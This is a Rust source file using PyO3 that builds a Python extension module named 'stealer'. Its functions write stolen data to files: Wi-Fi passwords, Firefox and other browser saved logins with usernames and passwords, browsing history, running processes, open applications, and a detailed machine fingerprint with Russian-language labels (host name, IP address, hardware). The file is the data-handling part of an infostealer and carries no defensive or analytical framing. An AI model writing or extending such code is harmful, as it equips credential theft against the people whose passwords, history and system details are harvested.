use pyo3::prelude::*;
use std::fs::File;
use std::io::Write;
use pyo3::exceptions;
use std::fs::OpenOptions;
use std::fs;


#[pyfunction]
fn write_processes_info(file_path: &str, process_names: Vec<&str>) -> PyResult<()> {
    let result = File::create(file_path).and_then(|mut file| {
        for i in &process_names {
            writeln!(file, "{}", i)?;
        }
        Ok(())
    });

    match result {
        Ok(_) => Ok(()),
        Err(err) => Err(exceptions::PyIOError::new_err(format!("Failed to write to file: {}", err))),
    }
}

#[pyfunction]
fn write_passwords_wifi(file_path: &str, pass_wifi: &str) -> PyResult<()> {
    let mut file = std::fs::File::create(file_path)?;

    file.write_all(pass_wifi.as_bytes())?;

    Ok(())
}

#[pyfunction]
fn write_history(file_path: &str, url: &str, title: &str, last_visit_time:&str) -> PyResult<()> {
    let mut file = OpenOptions::new().append(true).create(true).open(file_path)?;

    writeln!(
        file,
        r#"
        Url: {},
        Title: {},
        Last time visit: {}"#,
        url, title, last_visit_time
    )?;

    Ok(())
}

#[pyfunction]
fn write_passw_ff(file_path: &str, url: &str, user: &str, password: &str) -> PyResult<()> {
    let mut file = OpenOptions::new().append(true).create(true).open(file_path)?;

    writeln!(
        file,
        r#"
        Website: {},
        Username: {},
        Password: {}"#,
        url, user, password
    )?;

    Ok(())
}

#[pyfunction]
fn write_to_file(file_path: &str, origin_url: &str, action_url: &str, username: &str, password: &str) -> PyResult<()> {
    let mut file = OpenOptions::new().append(true).create(true).open(file_path)?;

    writeln!(
        file,
        r#"
        Url: {},
        Url Action: {},
        Username: {},
        Password: {}"#,
        origin_url, action_url, username, password
    )?;

    Ok(())
}

#[pyfunction]
fn write_pc_info(
    file_path: &str,
    total_gb: f64,
    used_gb: f64,
    free_gb: f64,
    disk_count: usize,
    cpu_count: usize,
    logical_cpu_count: usize,
    processor_model: &str,
    cpu_usage: f64,
    total_memory: f64,
    used_memory: f64,
    free_memory: f64,
    date_time: &str,
    current_directory: &str,
    info_ab_os: &str,
    host_name: &str,
    ip_address: &str,
    network_info: &str,
    gpu_name: &str,
    gpu_load: f64,
    gpu_temperature: f64,
    gpu_memory_total: f64,
    gpu_memory_used: f64,
    gpu_memory_free: f64,
) -> PyResult<()> {
    let mut file = std::fs::File::create(file_path)?;

    writeln!(
        file,
        r#"
        Всего места на диске: {} GB,
        Использовано места на диске: {} GB,
        Свободно места на диске: {} GB,
        Всего дисков: {}

        Количество ядер: {},
        Количество логических процессоров: {},
        Модель процессора: {},
        Использование процессора в процентах: {},

        Всего оперативной памяти: {} гигабайт,
        Использовано оперативной памяти: {} гигабайт,
        Свободно оперативной памяти: {} гигабайт,

        Скрипт был запущен в {},

        Скрипт был запущен из каталога: {},

        Информация об ос:{},

        Название компьютера: {},
        Айпи: {},
        Информация о сети: {},

        Видеокарта:
        название: {},
        Использование GPU: {}%,
        Температура GPU: {}°C,
        Общий объем памяти: {} MB,
        Использованная память: {} MB,
        Свободная память: {} MB
    "#,
        total_gb,
        used_gb,
        free_gb,
        disk_count,
        cpu_count,
        logical_cpu_count,
        processor_model,
        cpu_usage,
        total_memory,
        used_memory,
        free_memory,
        date_time,
        current_directory,
        info_ab_os,
        host_name,
        ip_address,
        network_info,
        gpu_name,
        gpu_load * 100.0,
        gpu_temperature,
        gpu_memory_total,
        gpu_memory_used,
        gpu_memory_free,
    )?;

    Ok(())
}


#[pyfunction]
fn write_open_files(file_path: &str, open_files: Vec<&str>) -> PyResult<()> {
    let mut file = File::create(file_path)?;

    writeln!(file, "Открытые приложения:")?;

    for app in open_files {
        writeln!(file, "{}", app)?;
    }

    Ok(())
}


#[pyfunction]
fn create_directory_if_not_exists(directory_path: &str) -> PyResult<()> {
    if !fs::metadata(directory_path).is_ok() {
        fs::create_dir_all(directory_path)?;
    }
    Ok(())
}



#[pymodule]
fn stealer(_py: Python, m: &PyModule) -> PyResult<()> {
    m.add_function(wrap_pyfunction!(write_processes_info, m)?)?;
    m.add_function(wrap_pyfunction!(write_to_file, m)?)?;
    m.add_function(wrap_pyfunction!(write_pc_info, m)?)?;
    m.add_function(wrap_pyfunction!(write_open_files, m)?)?;
    m.add_function(wrap_pyfunction!(create_directory_if_not_exists, m)?)?;
    m.add_function(wrap_pyfunction!(write_passwords_wifi, m)?)?;
    m.add_function(wrap_pyfunction!(write_history, m)?)?;
    m.add_function(wrap_pyfunction!(write_passw_ff, m)?)?;
    Ok(())
}
